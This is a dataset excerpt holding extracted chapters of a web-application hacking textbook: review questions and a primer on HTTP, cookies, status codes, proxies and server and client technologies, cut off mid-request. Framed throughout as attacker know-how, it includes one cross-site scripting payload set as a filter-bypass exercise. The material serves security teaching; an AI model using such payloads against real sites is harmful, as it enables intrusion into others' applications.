    "output": "70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 34\n34 Chapter 2 ■ Core Defense Mechanisms\nyou are targeting an application. Defects in these mechanisms often lead to\ncomplete compromise of the application, enabling you to access data belong-\ning to other users, perform unauthorized actions, and inject arbitrary code and\ncommands.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. Why are an application’s mechanisms for handling user access only as\nstrong as the weakest of these components?\n2. What is the difference between a session and a session token?\n3. Why is it not always possible to use a whitelist-based approach to input\nvalidation?\n4. You are attacking an application that implements an administrative\nfunction. You do not have any valid credentials to use the function.\nWhy should you nevertheless pay very close attention to it?\n5. An input validation mechanism designed to block cross-site scripting\nattacks performs the following sequence of steps on an item of input:\n1. Strip any <script>expressions that appear.\n2. Truncate the input to 50 characters.\n3. Remove any quotation marks within the input.\n4. URL-decode the input.\n5. If any items were deleted, return to step 1.\nCan you bypass this validation mechanism to smuggle the following\ndata past it?\n“><script>alert(“foo”)</script>"
  },
  {
    "input": "The HTTP Protocol",
    "output": "70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 35\nCHAPTER\n3\nWeb Application Technologies\nWeb applications employ a myriad of different technologies to implement\ntheir functionality. This chapter contains a short primer on the key technolo-\ngies that you are likely to encounter when attacking web applications. We shall\nexamine the HTTP protocol, the technologies commonly employed on the\nserver and client sides, and the encoding schemes used to represent data in\ndifferent situations. These technologies are in general easy to understand, and\na grasp of their relevant features is key to performing effective attacks against\nweb applications.\nIf you are already familiar with the key technologies used in web applications,\nyou can quickly skim through this chapter to confirm that there is nothing new\nin here for you. If you are still learning how web applications work, you should\nread this primer before continuing to the later chapters on specific vulnerabili-\nties. For further reading on any of the areas covered, we recommended HTTP:\nThe Definitive Guideby David Gourley and Brian Totty (O’Reilly, 2002).\nThe HTTP Protocol\nThe hypertext transfer protocol (HTTP) is the core communications protocol\nused to access the World Wide Web and is used by all of today’s web applica-\ntions. It is a simple protocol that was originally developed for retrieving static\ntext-based resources, and has since been extended and leveraged in various\n35\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 36\n36 Chapter 3 ■ Web Application Technologies\nways to enable it to support the complex distributed applications that are now\ncommonplace.\nHTTP uses a message-based model in which a client sends a request mes-\nsage, and the server returns a response message. The protocol is essentially\nconnectionless: although HTTP uses the stateful TCP protocol as its transport\nmechanism, each exchange of request and response is an autonomous transac-\ntion, and may use a different TCP connection.\nHTTP Requests\nAll HTTP messages (requests and responses) consist of one or more headers,\neach on a separate line, followed by a mandatory blank line, followed by an\noptional message body. A typical HTTP request is as follows:\nGET /books/search.asp?q=wahh HTTP/1.1\nAccept: image/gif, image/xxbitmap, image/jpeg, image/pjpeg,\napplication/xshockwaveflash, application/vnd.msexcel,\napplication/vnd.mspowerpoint, application/msword, */*\nReferer: http://wahh-app.com/books/default.asp\nAccept-Language: en-gb,en-us;q=0.5\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: wahh-app.com\nCookie: lang=en; JSESSIONID=0000tI8rk7joMx44S2Uu85nSWc_:vsnlc502\nThe first line of every HTTP request consists of three items, separated by\nspaces:\n■■ A verb indicating the HTTP method. The most commonly used method\nis GET, whose function is to retrieve a resource from the web server. GET\nrequests do not have a message body, so there is no further data follow-\ning the blank line after the message headers.\n■■ The requested URL. The URL functions as a name for the resource\nbeing requested, together with an optional query string containing\nparameters that the client is passing to that resource. The query string is\nindicated by the ?character in the URL, and in the example there is a\nsingle parameter with the name qand the value wahh.\n■■ The HTTP version being used. The only HTTP versions in common use\non the Internet are 1.0 and 1.1, and most browsers use version 1.1 by\ndefault. There are a few differences between the specifications of these\ntwo versions; however, the only difference you are likely to encounter\nwhen attacking web applications is that in version 1.1 the Hostrequest\nheader is mandatory.\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 37\nChapter 3 ■ Web Application Technologies 37\nSome other points of interest in the example request are:\n■■ The Refererheader is used to indicate the URL from which the request\noriginated (for example, because the user clicked a link on that page).\nNote that this header was misspelled in the original HTTP specification,\nand the misspelled version has been retained ever since.\n■■ The User-Agentheader is used to provide information about the\nbrowser or other client software that generated the request. Note that\nthe Mozilla prefix is included by most browsers for historical reasons—\nthis was the User-Agentstring used by the originally dominant Net -\nscape browser, and other browsers wished to assert to web sites that\nthey were compatible with this standard. As with many quirks from\ncomputing history, it has become so established that it is still retained,\neven on the current version of Internet Explorer, which made the\nrequest shown in the example.\n■■ The Hostheader is used to specify the hostname that appeared in the\nfull URL being accessed. This is necessary when multiple web sites are\nhosted on the same server, because the URL sent in the first line of the\nrequest does not normally contain a hostname. (See Chapter 16 for\nmore information about virtually hosted web sites.)\n■■ The Cookieheader is used to submit additional parameters that the\nserver has issued to the client (described in more detail later in this\nchapter).\nHTTP Responses\nA typical HTTP response is as follows:\nHTTP/1.1 200 OK\nDate: Sat, 19 May 2007 13:49:37 GMT\nServer: IBM_HTTP_SERVER/1.3.26.2 Apache/1.3.26 (Unix)\nSet-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc\nPragma: no-cache\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nContent-Type: text/html;charset=ISO-8859-1\nContent-Language: en-US\nContent-Length: 24246\n<!DOCTYPE html PUBLIC “-//W3C//DTD HTML 4.01 Transitional//EN”>\n<html lang=”en”>\n<head>\n<meta http-equiv=”Content-Type” content=”text/html;\ncharset=iso-8859-1”>\n...\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 38\n38 Chapter 3 ■ Web Application Technologies\nThe first line of every HTTP response consists of three items, separated by\nspaces:\n■■ The HTTP version being used.\n■■ A numeric status code indicating the result of the request. 200 is the\nmost common status code; it means that the request was successful and\nthe requested resource is being returned.\n■■ A textual “reason phrase” further describing the status of the response.\nThis can have any value and is not used for any purpose by current\nbrowsers.\nSome other points of interest in the previous response are:\n■■ The Serverheader contains a banner indicating the web server soft-\nware being used, and sometimes other details such as installed modules\nand the server operating system. The information contained may or\nmay not be accurate.\n■■ The Set-Cookieheader is issuing the browser a further cookie; this will\nbe submitted back in the Cookieheader of subsequent requests to this\nserver.\n■■ The Pragmaheader is instructing the browser not to store the response\nin its cache, and the Expiresheader also indicates that the response\ncontent expired in the past and so should not be cached. These instruc-\ntions are frequently issued when dynamic content is being returned, to\nensure that browsers obtain a fresh version of this content on subse-\nquent occasions.\n■■ Almost all HTTP responses contain a message body following the blank\nline after the headers, and the Content-Typeheader indicates that the\nbody of this message contains an HTML document.\n■■ The Content-Lengthheader indicates the length of the message body in\nbytes.\nHTTP Methods\nWhen you are attacking web applications, you will be dealing almost exclu-\nsively with the most commonly used methods: GETand POST. There are some\nimportant differences between these methods which you need to be aware of,\nand which can affect an application’s security if overlooked.\nThe GETmethod is designed for retrieval of resources. It can be used to send\nparameters to the requested resource in the URL query string. This enables users\nto bookmark a URL for a dynamic resource that can be reused by themselves or\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 39\nChapter 3 ■ Web Application Technologies 39\nother users to retrieve the equivalent resource on a subsequent occasion (as in a\nbookmarked search query). URLs are displayed on-screen, and are logged in\nvarious places, such as the browser history and the web server’s access logs.\nThey are also transmitted in the Referer header to other sites when external\nlinks are followed. For these reasons, the query string should not be used to\ntransmit any sensitive information.\nThe POST method is designed for performing actions. With this method,\nrequest parameters can be sent both in the URL query string and in the body\nof the message. Although the URL can still be bookmarked, any parameters\nsent in the message body will be excluded from the bookmark. These parame-\nters will also be excluded from the various locations in which logs of URLs are\nmaintained and from the Referer header. Because the POST method is\ndesigned for performing actions, if a user clicks the Back button of the browser\nto return to a page that was accessed using this method, the browser will not\nautomatically reissue the request but will warn the user of what it is about to\ndo, as shown in Figure 3-1. This prevents users from unwittingly performing\nan action more than once. For this reason, POSTrequests should always be used\nwhen an action is being performed.\nFigure 3-1: Browsers do not automatically reissue POST requests made by users,\nbecause these might result in an action being performed more than once\nIn addition to the GET and POST methods, the HTTP protocol supports\nnumerous other methods that have been created for specific purposes. The\nother methods you are most likely to require knowledge of are:\n■■ HEAD — This functions in the same way as a GETrequest except that\nthe server should not return a message body in its response. The server\nshould return the same headers that it would have returned to the cor-\nresponding GETrequest. Hence, this method can be used for checking\nwhether a resource is present before making a GETrequest for it.\n■■ TRACE — This method is designed for diagnostic purposes. The server\nshould return in the response body the exact contents of the request\nmessage that it received. This can be used to detect the effect of any\nproxy servers between the client and server that may manipulate the\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 40\n40 Chapter 3 ■ Web Application Technologies\nrequest. It can also sometimes be used as part of an attack against other\napplication users (see Chapter 12).\n■■ OPTIONS — This method asks the server to report the HTTP methods\nthat are available for a particular resource. The server will typically\nreturn a response containing an Allowheader that lists the available\nmethods.\n■■ PUT — This method attempts to upload the specified resource to the\nserver, using the content contained in the body of the request. If this\nmethod is enabled, then you may be able to leverage it to attack the\napplication; for example, by uploading an arbitrary script and execut-\ning this on the server.\nMany other HTTP methods exist that are not directly relevant to attacking\nweb applications. However, a web server may expose itself to attack if certain\ndangerous methods are available. See Chapter 17 for further details on these\nand examples of using them in an attack.\nURLs\nA uniform resource locator (URL) is a unique identifier for a web resource, via\nwhich that resource can be retrieved. The format of most URLs is as follows:\nprotocol://hostname[:port]/[path/]file[?param=value]\nSeveral components in this scheme are optional, and the port number is nor-\nmally only included if it diverges from the default used by the relevant proto-\ncol. The URL used to generate the HTTP request shown earlier is:\nhttp://wahh-app.comm/books/search.asp?q=wahh\nIn addition to this absolute form, URLs may be specified relative to a partic-\nular host, or relative to a particular path on that host, for example:\n/books/search.asp?q=wahh\nsearch.asp?q=wahh\nThese relative forms are often used in web pages to describe navigation\nwithin the web site or application itself.\nNOTE The correct technical term for a URL is actually URI(or uniform\nresource identifier), but this term is really only used in formal specifications\nand by those who wish to exhibit their pedantry.\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 41\nChapter 3 ■ Web Application Technologies 41\nHTTP Headers\nHTTP supports a large number of different headers, some of which are\ndesigned for specific unusual purposes. Some headers can be used for both\nrequests and responses, while others are specific to one of these message types.\nThe headers you are likely to encounter when attacking web applications are\nlisted here.\nGeneral Headers\n■■ Connection — This is used to inform the other end of the communica-\ntion whether it should close the TCP connection after the HTTP trans-\nmission has completed or keep it open for further messages.\n■■ Content-Encoding— This is used to specify what kind of encoding is\nbeing used for the content contained in the message body, such as gzip,\nwhich is used by some applications to compress responses for faster\ntransmission.\n■■ Content-Length— This is used to specify the length of the message\nbody, in bytes (except in the case of responses to HEADrequests, when it\nindicates the length of the body in the response to the corresponding\nGETrequest).\n■■ Content-Type— This is used to specify the type of content contained in\nthe message body; for example, text/htmlfor HTML documents.\n■■ Transfer-Encoding— This is used to specify any encoding that was\nperformed on the message body to facilitate its transfer over HTTP. It is\nnormally used to specify chunked encoding when this is employed.\nRequest Headers\n■■ Accept — This is used to tell the server what kinds of content the client\nis willing to accept, such as image types, office document formats, and\nso on.\n■■ Accept-Encoding— This is used to tell the server what kinds of content\nencoding the client is willing to accept.\n■■ Authorization — This is used to submit credentials to the server for one\nof the built-in HTTP authentication types.\n■■ Cookie — This is used to submit cookies to the server which were pre-\nviously issued by it.\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 42\n42 Chapter 3 ■ Web Application Technologies\n■■ Host — This is used to specify the hostname that appeared in the full\nURL being requested.\n■■ If-Modified-Since— This is used to specify the time at which the\nbrowser last received the requested resource. If the resource has not\nchanged since that time, the server may instruct the client to use its\ncached copy, using a response with status code 304.\n■■ If-None-Match— This is used to specify an entity tag, which is an iden-\ntifier denoting the contents of the message body. The browser submits\nthe entity tag that the server issued with the requested resource when it\nwas last received. The server can use the entity tag to determine\nwhether the browser may use its cached copy of the resource.\n■■ Referer — This is used to specify the URL from which the current\nrequest originated.\n■■ User-Agent— This is used to provide information about the browser or\nother client software that generated the request.\nResponse Headers\n■■ Cache-Control— This is used to pass caching directives to the browser\n(for example, no-cache).\n■■ ETag — This is used to specify an entity tag. Clients can submit this\nidentifier in future requests for the same resource in the If-None-Match\nheader to notify the server which version of the resource the browser\ncurrently holds in its cache.\n■■ Expires — This is used to instruct the browser how long the contents of\nthe message body are valid for. The browser may use the cached copy\nof this resource until this time.\n■■ Location — This is used in redirection responses (those with a status\ncode starting with 3) to specify the target of the redirect.\n■■ Pragma — This is used to pass caching directives to the browser (for\nexample, no-cache).\n■■ Server — This is used to provide information about the web server soft-\nware being used.\n■■ Set-Cookie— This is used to issue cookies to the browser that it will\nsubmit back to the server in subsequent requests.\n■■ WWW-Authenticate— This is used in responses with a 401 status code\nto provide details of the type(s) of authentication supported by the\nserver.\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 43\nChapter 3 ■ Web Application Technologies 43\nCookies\nCookies are a key part of the HTTP protocol which most web applications rely\nupon, and which can frequently be used as a vehicle for exploiting vulnerabil-\nities. The cookie mechanism enables the server to send items of data to the\nclient, which the client stores and resubmits back to the server. Unlike the\nother types of request parameters (those within the URL query string or the\nmessage body), cookies continue to be resubmitted in each subsequent request\nwithout any particular action required by the application or the user.\nA server issues a cookie using the Set-Cookie response header, as already\nobserved:\nSet-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc\nThe user’s browser will then automatically add the following header to sub-\nsequent requests back to the same server:\nCookie: tracking=tI8rk7joMx44S2Uu85nSWc\nCookies normally consist of a name/value pair, as shown, but may consist\nof any string that does not contain a space. Multiple cookies can be issued by\nusing multiple Set-Cookie headers in the server’s response, and are all sub-\nmitted back to the server in the same Cookie header, with a semicolon sepa-\nrating different individual cookies.\nIn addition to the cookie’s actual value, the Set-Cookie header can also\ninclude any of the following optional attributes, which can be used to control\nhow the browser handles the cookie:\n■■ expires — Used to set a date until which the cookie is valid. This will\ncause the browser to save the cookie to persistent storage, and it will be\nreused in subsequent browser sessions until the expiration date is\nreached. If this attribute is not set, the cookie is used only in the current\nbrowser session.\n■■ domain — Used to specify the domain for which the cookie is valid.\nThis must be the same or a parent of the domain from which the cookie\nis received.\n■■ path — Used to specify the URL path for which the cookie is valid.\n■■ secure– If this attribute is set, then the cookie will only ever be submit-\nted in HTTPS requests.\n■■ HttpOnly — If this attribute is set, then the cookie cannot be directly\naccessed via client-side JavaScript, although not all browsers support\nthis restriction.\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 44\n44 Chapter 3 ■ Web Application Technologies\nEach of these cookie attributes can impact the security of the application,\nand the primary impact is on the ability of an attacker to directly target other\nusers of the application. See Chapter 12 for further details.\nStatus Codes\nEach HTTP response message must contain a status code in its first line, indi-\ncating the result of the request. The status codes fall into five groups, accord-\ning to the first digit of the code:\n■■ 1xx — Informational.\n■■ 2xx — The request was successful.\n■■ 3xx — The client is redirected to a different resource.\n■■ 4xx — The request contains an error of some kind.\n■■ 5xx — The server encountered an error fulfilling the request.\nThere are numerous specific status codes, many of which are used only in\nspecialized circumstances. The status codes you are most likely to encounter\nwhen attacking a web application are listed here, together with the usual rea-\nson phrase associated with them:\n■■ 100 Continue— This response is sent in some circumstances when a\nclient submits a request containing a body. The response indicates that\nthe request headers were received and that the client should continue\nsending the body. The server will then return a second response when\nthe request has been completed.\n■■ 200 Ok — This indicates that the request was successful and the\nresponse body contains the result of the request.\n■■ 201 Created — This is returned in response to a PUTrequest to indicate\nthat the request was successful.\n■■ 301 Moved Permanently — This redirects the browser permanently to a\ndifferent URL, which is specified in the Locationheader. The client\nshould use the new URL in the future rather than the original.\n■■ 302 Found — This redirects the browser temporarily to a different URL,\nwhich is specified in the Locationheader. The client should revert to\nthe original URL in subsequent requests.\n■■ 304 Not Modified — This instructs the browser to use its cached copy\nof the requested resource. The server uses the If-Modified-Sinceand\nIf-None-Matchrequest headers to determine whether the client has the\nlatest version of the resource.\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 45\nChapter 3 ■ Web Application Technologies 45\n■■ 400 Bad Request — This indicates that the client submitted an invalid\nHTTP request. You will probably encounter this when you have modi-\nfied a request in certain invalid ways, for example by placing a space\ncharacter into the URL.\n■■ 401 Unauthorized — The server requires HTTP authentication before\nthe request will be granted. The WWW-Authenticateheader contains\ndetails of the type(s) of authentication supported.\n■■ 403 Forbidden — This indicates that no one is allowed to access the\nrequested resource, regardless of authentication.\n■■ 404 Not Found — This indicates that the requested resource does not\nexist.\n■■ 405 Method Not Allowed — This indicates that the method used in the\nrequest is not supported for the specified URL. For example, you may\nreceive this status code if you attempt to use the PUTmethod where it is\nnot supported.\n■■ 413 Request Entity Too Large — If you are probing for buffer overflow\nvulnerabilities in native code, and so submitting long strings of data,\nthis indicates that the body of your request is too large for the server to\nhandle.\n■■ 414 Request URI Too Long — Similar to the previous response, this\nindicates that the URL used in the request is too large for the server to\nhandle.\n■■ 500 Internal Server Error — This indicates that the server encountered\nan error fulfilling the request. This normally occurs when you have sub-\nmitted unexpected input that caused an unhandled error somewhere\nwithin the application’s processing. You should review the full contents\nof the server’s response closely for any details indicating the nature of\nthe error.\n■■ 503 Service Unavailable — This normally indicates that, although\nthe web server itself is functioning and able to respond to requests, the\napplication accessed via the server is not responding. You should verify\nwhether this is the result of any action that you have performed.\nHTTPS\nThe HTTP protocol uses plain TCP as its transport mechanism, which is unen-\ncrypted and so can be intercepted by an attacker who is suitably positioned on\nthe network. HTTPS is essentially the same application-layer protocol as\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 46\n46 Chapter 3 ■ Web Application Technologies\nHTTP, but this is tunneled over the secure transport mechanism, Secure Sock-\nets Layer (SSL). This protects the privacy and integrity of all data passing over\nthe network, considerably reducing the possibilities for noninvasive intercep-\ntion attacks. HTTP requests and responses function in exactly the same way\nregardless of whether SSL is used for transport.\nNOTE SSL has now strictly been superseded by transport layer security (TLS),\nbut the latter is still normally referred to using the older name.\nHTTP Proxies\nAn HTTP proxy server is a server that mediates access between the client\nbrowser and the destination web server. When a browser has been configured\nto use a proxy server, it makes all of its requests to that server, and the proxy\nrelays the requests to the relevant web servers, and forwards their responses\nback to the browser. Most proxies also provide additional services, including\ncaching, authentication, and access control.\nThere are two differences in the way HTTP works when a proxy server is\nbeing used, which you should be aware of:\n■■ When a browser issues an HTTP request to a proxy server, it places the\nfull URL into the request, including the protocol prefix http://and the\nhostname of the server. The proxy server extracts the hostname and\nuses this to direct the request to the correct destination web server.\n■■ When HTTPS is being used, the browser cannot perform the SSL hand-\nshake with the proxy server, as this would break the secure tunnel and\nleave the communications vulnerable to interception attacks. Hence, the\nbrowser must use the proxy as a pure TCP-level relay, which passes all\nnetwork data in both directions between the browser and the destina-\ntion web server, with which the browser performs an SSL handshake as\nnormal. To establish this relay, the browser makes an HTTP request to\nthe proxy server using the CONNECTmethod and specifying the destina-\ntion hostname and port number as the URL. If the proxy allows the\nrequest, it returns an HTTP response with a 200 status, keeps the TCP\nconnection open, and from that point onwards acts as a pure TCP-level\nrelay to the destination web server.\nBy some measure, the most useful item in your toolkit when attacking web\napplications is a specialized kind of proxy server that sits between your\nbrowser and the target web site and allows you to intercept and modify all\nrequests and responses, even those using HTTPS. We will begin examining\nhow you can use this kind of tool in the next chapter."
  },
  {
    "input": "Web Functionality",
    "output": "70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 47\nChapter 3 ■ Web Application Technologies 47\nHTTP Authentication\nThe HTTP protocol includes its own mechanisms for authenticating users,\nusing various authentication schemes, including:\n■■ Basic — This is a very simple authentication mechanism that sends\nuser credentials as a Base64-encoded string in a request header with\neach message.\n■■ NTLM — This is a challenge-response mechanism and uses a version of\nthe Windows NTLM protocol.\n■■ Digest — This is a challenge-response mechanism and uses MD5\nchecksums of a nonce with the user’s credentials.\nIt is relatively rare to encounter these authentication protocols being used by\nweb applications deployed on the Internet, although they are more commonly\nused within organizations to access intranet-based services.\nCOMMON MYTH “Basic authentication is insecure.”\nBasic authentication places credentials in unencrypted form within the HTTP\nrequest, and so it is frequently stated that the protocol is insecure and should\nnot be used. But forms-based authentication, as used by numerous banks, also\nplaces credentials in unencrypted form within the HTTP request.\nAny HTTP message can be protected from eavesdropping attacks by\nusing HTTPS as a transport mechanism, which should be done by every\nsecurity-conscious application. In relation to eavesdropping at least, basic\nauthentication is in itself no worse than the methods used by the majority of\ntoday’s web applications.\nWeb Functionality\nIn addition to the core communications protocol used to send messages\nbetween client and server, web applications employ numerous different tech-\nnologies to deliver their functionality. Any reasonably functional application\nmay employ dozens of distinct technologies within its server and client com-\nponents. Before you can mount a serious attack against a web application, you\nneed a basic understanding of how its functionality is implemented, how the\ntechnologies used are designed to behave, and where their weak points are\nlikely to lie.\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 48\n48 Chapter 3 ■ Web Application Technologies\nServer-Side Functionality\nThe early World Wide Web contained entirely static content. Web sites con-\nsisted of various resources such as HTML pages and images, which were sim-\nply loaded onto a web server and delivered to any user who requested them.\nEach time a particular resource was requested, the server responded with the\nsame content.\nToday’s web applications still typically employ a fair number of static\nresources. However, a large amount of the content that they present to users is\ngenerated dynamically. When a user requests a dynamic resource, the server’s\nresponse is created on the fly, and each user may receive content that is\nuniquely customized for them.\nDynamic content is generated by scripts or other code executing on the\nserver. These scripts are akin to computer programs in their own right—they\nhave various inputs, perform processing on these, and return their outputs to\nthe user.\nWhen a user’s browser makes a request for a dynamic resource, it does not\nnormally simply ask for a copy of that resource. In general, it will also submit\nvarious parameters along with its request. It is these parameters that enable\nthe server-side application to generate content that is tailored to the individual\nuser. There are three main ways in which HTTP requests can be used to send\nparameters to the application:\n■■ In the URL query string.\n■■ In HTTP cookies.\n■■ In the body of requests using the POSTmethod.\nIn addition to these primary sources of input, the server-side application\nmay in principle use any part of the HTTP request as an input to its processing.\nFor example, an application may process the User-Agent header to generate\ncontent that is optimized for the type of browser being used.\nLike computer software in general, web applications employ a wide range\nof technologies on the server side to deliver their functionality. These include:\n■■ Scripting languages such as PHP, VBScript, and Perl.\n■■ Web application platforms such as ASP.NET and Java.\n■■ Web servers such as Apache, IIS, and Netscape Enterprise.\n■■ Databases such as MS-SQL, Oracle, and MySQL.\n■■ Other back-end components such as file systems, SOAP-based web ser-\nvices, and directory services.\nAll of these technologies and the types of vulnerabilities that can arise in\nrelation to them will be examined in detail throughout this book. Some of the\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 49\nChapter 3 ■ Web Application Technologies 49\nmost common web application platforms and languages you are likely to\nencounter are described in the following sections.\nThe Java Platform\nFor several years, the Java Platform, Enterprise Edition (formerly known as\nJ2EE) has been a de facto standard for large-scale enterprise applications.\nDeveloped by Sun Microsystems, it lends itself to multi-tiered and load-bal-\nanced architectures, and is well suited to modular development and code\nreuse. Because of its long history and widespread adoption, there are many\nhigh-quality development tools, application servers, and frameworks avail-\nable to assist developers. The Java Platform can be run on several underlying\noperating systems, including Windows, Linux, and Solaris.\nDescriptions of Java-based web applications often employ a number of\npotentially confusing terms that you may need to be aware of:\n■■ An Enterprise Java Bean(EJB) is a relatively heavyweight software\ncomponent that encapsulates the logic of a specific business function\nwithin the application. EJBs are intended to take care of various techni-\ncal challenges that application developers must address, such as trans-\nactional integrity.\n■■ A Plain Old Java Object(POJO) is an ordinary Java object, as distinct\nfrom a special object like an EJB. POJO is normally used to denote\nobjects that are user-defined and much simpler and more lightweight\nthan EJBs and those used in other frameworks.\n■■ A Java Servletis an object that resides on an application server and\nreceives HTTP requests from clients and returns HTTP responses. There\nare numerous useful interfaces that Servlet implementations can use to\nfacilitate the development of useful applications.\n■■ A Java web containeris a platform or engine that provides a runtime\nenvironment for Java-based web applications. Examples of Java web\ncontainers are Apache Tomcat, BEA WebLogic, and JBoss.\nMany Java web applications employ third-party and open source compo-\nnents alongside custom-built code. This is an attractive option because it\nreduces development effort, and Java is well-suited to this modular approach.\nExamples of components commonly used for key application functions are:\n■■ Authentication — JAAS, ACEGI\n■■ Presentation layer— SiteMesh, Tapestry\n■■ Database object relational mapping— Hibernate\n■■ Logging — Log4J\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 50\n50 Chapter 3 ■ Web Application Technologies\nIf you can determine which open source packages are used in the applica-\ntion you are attacking, you can download these and perform a code review or\ninstall them to experiment on. A vulnerability in any of these may be\nexploitable to compromise the wider application.\nASP.NET\nASP.NET is Microsoft’s web application framework and is a direct competitor\nto the Java Platform. ASP.NET is several years younger than its counterpart\nbut has made some inroads into Java’s territory.\nASP.NET uses Microsoft’s .NET Framework, which provides a virtual\nmachine (the Common Language Runtime) and a set of powerful APIs. Hence,\nASP.NET applications can be written in any .NET language, such as C# or\nVB.NET.\nASP.NET lends itself to the event-driven programming paradigm which is\nnormally used in conventional desktop software, rather than the script-based\napproach used in most earlier web application frameworks. This, together\nwith the powerful development tools provided with Visual Studio, make\ndeveloping a functional web application extremely easy for anyone with min-\nimal programming skills.\nThe ASP.NET framework helps to protect against some common web appli-\ncation vulnerabilities such as cross-site scripting, without requiring any effort by\nthe developer. However, one practical downside of its apparent simplicity is that\nmany small-scale ASP.NET applications are actually created by beginners who\nlack any awareness of the core security problems faced by web applications.\nPHP\nThe PHP language emerged out of a hobby project (the acronym originally\nstood for personal home page). It has since evolved almost unrecognizably\ninto a highly powerful and rich framework for developing web applications. It\nis often used in conjunction with other free technologies in what is known as\nthe LAMP stack (comprising Linux, Apache, MySQL, and PHP).\nNumerous open source applications and components have been developed\nusing PHP. Many of these provide off-the-shelf solutions for common applica-\ntion functions, which are often incorporated into wider custom-built applica-\ntions, for example:\n■■ Bulletin boards— PHPBB, PHP-Nuke\n■■ Administrative front ends— PHPMyAdmin\n■■ Web mail— SquirrelMail, IlohaMail\n■■ Photo galleries— Gallery\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 51\nChapter 3 ■ Web Application Technologies 51\n■■ Shopping carts— osCommerce, ECW-Shop\n■■ Wikis— MediaWiki, WakkaWikki\nBecause PHP is free and easy to use, it has often been the language of choice\nfor many beginners writing web applications. Further, the design and default\nconfiguration of the PHP framework has historically made it easy for pro-\ngrammers to unwittingly introduce security bugs into their code. These factors\nhave meant that applications written in PHP have suffered from a dispropor-\ntionate number of security vulnerabilities. In addition to this, several defects\nhave existed within the PHP platform itself, which could often be exploited via\napplications running on it. See Chapter 18 for details of common defects aris-\ning in PHP applications.\nClient-Side Functionality\nIn order for the server-side application to receive user input and actions, and\npresent the results of these back to the user, it needs to provide a client-side\nuser interface. Because all web applications are accessed via a web browser,\nthese interfaces all share a common core of technologies. However, these have\nbeen built upon in various diverse ways, and the ways in which applications\nleverage client-side technology has continued to evolve rapidly in recent\nyears.\nHTML\nThe core technology used to build web interfaces is the hypertext markup lan-\nguage (HTML). This is a tag-based language that is used to describe the struc-\nture of documents that are rendered within the browser. From its simple\nbeginnings as a means of providing basic formatting to text documents,\nHTML has developed into a rich and powerful language that can be used to\ncreate highly complex and functional user interfaces.\nHyperlinks\nA large amount of communication from client to server is driven by the user\nclicking on hyperlinks. In web applications, hyperlinks frequently contain pre-\nset request parameters. These are items of data which are never entered by the\nuser but which are submitted because the server placed them into the target\nURL of the hyperlink on which the user clicks. For example, a web application\nmight present a series of links to news stories, each having the following form:\n<a href=”/news/showStory?newsid=19371130&lang=en”>Sale now on!</a>\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 52\n52 Chapter 3 ■ Web Application Technologies\nWhen a user clicks on this link, the browser makes the following request:\nGET /news/showStory?newsid=19371130&lang=en HTTP/1.1\nHost: wahh-app.com\n...\nThe server receives the two parameters in the query string (newsid and\nlang) and uses their values to determine what content should be presented to\nthe user.\nForms\nWhile hyperlink-based navigation is responsible for the majority of client-to-\nserver communications, in most web applications there is a need for more flex-\nible ways of gathering input and receiving actions from users. HTML forms\nare the usual mechanism for allowing users to enter arbitrary input via their\nbrowser. A typical form is as follows:\n<form action=”/secure/login.php?app=quotations” method=”post”>\nusername: <input type=”text” name=”username”><br>\npassword: <input type=”password” name=”password”>\n<input type=”hidden” name=”redir” value=”/secure/home.php”>\n<input type=”submit” name=”submit” value=”log in”>\n</form>\nWhen the user enters values into the form and clicks the submit button, the\nbrowser makes a request like the following:\nPOST /secure/login.php?app=quotations HTTP/1.1\nHost: wahh-app.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 39\nCookie: SESS=GTnrpx2ss2tSWSnhXJGyG0LJ47MXRsjcFM6Bd\nusername=daf&password=foo&redir=/secure/home.php&submit=log+in\nIn this request, there are several points of interest reflecting how different\naspects of the request are used to control server-side processing:\n■■ Because the HTML form tag contained an attribute specifying the POST\nmethod, the browser uses this method to submit the form, and places\nthe data from the form into the body of the request message.\n■■ In addition to the two items of data entered by the user, the form con-\ntains a hidden parameter (redir) and a submit parameter (submit).\nBoth of these are submitted in the request and may be used by the\nserver-side application to control its logic.\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 53\nChapter 3 ■ Web Application Technologies 53\n■■ The target URL for the form submission contains a preset parameter\n(app), as in the hyperlink example shown previously. This parameter\nmay be used to control the server-side processing.\n■■ The request contains a cookie parameter (SESS), which was issued to\nthe browser in an earlier response from the server. This parameter may\nbe used to control the server-side processing.\nThe previous request contains a header specifying that the type of content in\nthe message body is x-www-form-urlencoded. This means that parameters are\nrepresented in the message body as name/value pairs in the same way as they\nare in the URL query string. The other content type you are likely to encounter\nwhen form data is submitted is multipart/form-data. An application can\nrequest that browsers use multipart encoding by specifying this in an enctype\nattribute in the form tag. With this form of encoding, the Content-Typeheader\nin the request will also specify a random string that is used as a separator for\nthe parameters contained in the request body. For example, if the form speci-\nfied multipart encoding, the resulting request would look like the following:\nPOST /secure/login.php?app=quotations HTTP/1.1\nHost: wahh-app.com\nContent-Type: multipart/form-data; boundary=------------7d71385d0a1a\nContent-Length: 369\nCookie: 